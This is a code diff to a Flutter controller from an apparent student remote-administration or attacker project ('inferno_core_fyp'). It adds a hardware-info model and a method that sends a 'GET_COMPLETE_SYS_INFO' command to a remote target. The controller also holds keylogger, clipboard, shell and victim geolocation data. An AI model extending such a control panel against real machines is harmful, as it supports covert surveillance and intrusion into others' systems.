@@ -2,6 +2,7 @@ import 'package:flutter/material.dart';
 import 'package:get/get.dart';
 import 'package:inferno_core_fyp/models/process_model.dart';
 
+import '../../models/hardware_info_model.dart';
 import '../../utils/utils.dart';
 import 'io_attacker_controller.dart';
 
@@ -9,15 +10,27 @@ class GeneralController extends GetxController {
   RxInt selectedIndex = 0.obs;
   RxBool isClipboard = true.obs, isTaskManagerEnabled = true.obs;
   RxString sysModelName = ''.obs, sysRam = ''.obs, sysOS = ''.obs;
+
   RxString clipboardData = 'No data'.obs,
       keyloggerData = ''.obs,
       hostFileData = ''.obs,
       shellData = ''.obs;
+
   RxString publicIP = ''.obs,
       country = ''.obs,
       city = ''.obs,
       showInTable = ''.obs;
   RxInt maxLines = 1.obs;
+
+  Rx<HardwareInfo> hardwareInfo = HardwareInfo(
+    cpuUsage: '',
+    ramUsage: RamUsage(totalGb: 0, usedGb: 0),
+    diskUsage: [],
+    bootTime: '',
+    networkInterfaces: {},
+    battery: '',
+  ).obs;
+
   RxList<DataRow> networkData = <DataRow>[].obs;
   RxList<Process> processes = <Process>[].obs;
 
@@ -213,4 +226,21 @@ class GeneralController extends GetxController {
       }
     }
   }
+
+  Future<void> getHardwareInfo(String targetId) async {
+    await Future.delayed(const Duration(seconds: 1));
+    if (hardwareInfo.value.cpuUsage == '') {
+      try {
+        Map<String, dynamic> response =
+            await ioAttackerController.executeCommand(
+          targetId: targetId,
+          data: {"text": "GET_COMPLETE_SYS_INFO", "command_args": {}},
+        );
+        hardwareInfo.value = HardwareInfo.fromJson(response);
+      } catch (e) {
+        Utils.toastMsg("Error: $e");
+      }
+    }
+  }
+
 }
